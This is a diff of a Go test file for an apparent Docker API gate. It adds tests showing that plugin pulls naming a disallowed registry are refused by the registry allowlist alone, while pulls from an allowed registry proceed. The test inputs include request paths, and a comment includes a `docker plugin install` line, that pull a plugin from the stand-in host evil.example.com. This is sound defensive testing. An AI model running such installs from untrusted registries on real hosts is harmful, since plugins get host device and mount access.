@@ -378,12 +378,15 @@ func TestLowercaseCreateFieldsAreStillJudged(t *testing.T) {
 // traffic that cannot be attributed must not proceed.
 func TestUnattributableEndpointsAreRefused(t *testing.T) {
 	for _, path := range []string{
-		"/v1.44/plugins/pull?remote=evil.example.com/rogue",
-		"/plugins/pull",
-		"/v1.44/plugins/evil%2Frogue/upgrade?remote=evil.example.com/rogue",
+		// Swarm genuinely cannot be attributed without parsing a TaskSpec,
+		// and refusing beats parsing it and getting it subtly wrong.
 		"/v1.44/services/create",
 		"/v1.44/services/abc123/update",
 		"/v1.44/swarm/init",
+		// A plugin pull with NO remote: attributable in principle, not in
+		// this request. It keeps the conservative treatment rather than
+		// passing unjudged (#420).
+		"/plugins/pull",
 	} {
 		gate := &fakeImageGate{denyBuild: "allowlist is in force"}
 		resp, engineReached := driveRequest(t, gate,
@@ -395,6 +398,54 @@ func TestUnattributableEndpointsAreRefused(t *testing.T) {
 		if engineReached() {
 			t.Errorf("%s: reached the engine", path)
 		}
+	}
+}
+
+// A plugin pull that NAMES its registry is judged as the pull it is (#420),
+// not as an unattributable build.
+//
+// This is the hole the split closes. These endpoints used to inherit the build
+// default — allowed unless deny-unattributable-builds was explicitly set — so
+// a plain allow-registries let `docker plugin install evil.example.com/p`
+// through. A plugin gets host device and mount access where an image gets a
+// container, which made it a worse hole than the build one the permissive
+// default was chosen to tolerate.
+func TestPluginPullIsJudgedAsAPull(t *testing.T) {
+	for _, path := range []string{
+		"/v1.44/plugins/pull?remote=evil.example.com/rogue",
+		"/v1.44/plugins/evil%2Frogue/upgrade?remote=evil.example.com/rogue",
+		"/plugins/pull?remote=evil.example.com/rogue&name=rogue",
+	} {
+		// Note: denyBuild is EMPTY. The whole point is that the registry
+		// allowlist alone refuses this, with no opt-in.
+		gate := &fakeImageGate{denyPull: "policy does not allow images from evil.example.com"}
+		resp, engineReached := driveRequest(t, gate,
+			"POST "+path+" HTTP/1.1\r\nHost: d\r\nContent-Length: 0\r\n\r\n")
+
+		if resp.StatusCode != http.StatusForbidden {
+			t.Errorf("%s: status = %d, want 403 — allow-registries alone must refuse this", path, resp.StatusCode)
+		}
+		if engineReached() {
+			t.Errorf("%s: reached the engine", path)
+		}
+		if gate.sawPull != "evil.example.com/rogue" {
+			t.Errorf("%s: gate saw pull %q, want the remote", path, gate.sawPull)
+		}
+	}
+}
+
+// ...and a plugin from an ALLOWED registry still installs. The rule restricts
+// where plugins come from; it does not ban the feature.
+func TestPluginPullFromAnAllowedRegistryProceeds(t *testing.T) {
+	gate := &fakeImageGate{} // allows everything
+	resp, engineReached := driveRequest(t, gate,
+		"POST /v1.44/plugins/pull?remote=registry.example.com/ok HTTP/1.1\r\nHost: d\r\nContent-Length: 0\r\n\r\n")
+
+	if resp.StatusCode != http.StatusOK || !engineReached() {
+		t.Errorf("a permitted plugin was blocked (status %d, reached=%v)", resp.StatusCode, engineReached())
+	}
+	if gate.sawPull != "registry.example.com/ok" {
+		t.Errorf("gate saw pull %q, want the remote", gate.sawPull)
 	}
 }
 
